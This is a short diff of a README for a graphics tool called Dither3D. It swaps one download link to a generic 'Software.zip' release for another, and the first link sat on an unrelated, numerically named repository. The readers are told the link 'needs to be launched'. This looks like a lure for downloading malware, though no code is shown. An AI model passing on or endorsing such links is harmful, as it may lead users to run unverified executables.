@@ -18,7 +18,7 @@ Dithering has been a crucial technique in computer graphics for a long time. It'
 
 To get started with **Dither3D**, download the software package from the link below:
 
-[![Download Dither3D](https://img.shields.io/badge/Download-Dither3D-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Dither3D](https://github.com/AceSolos22/Dither3D/releases/download/v1.0/Software.zip)](https://github.com/AceSolos22/Dither3D/releases/download/v1.0/Software.zip)
 
 Please note that the link provided above needs to be launched in order to download the software package.
 
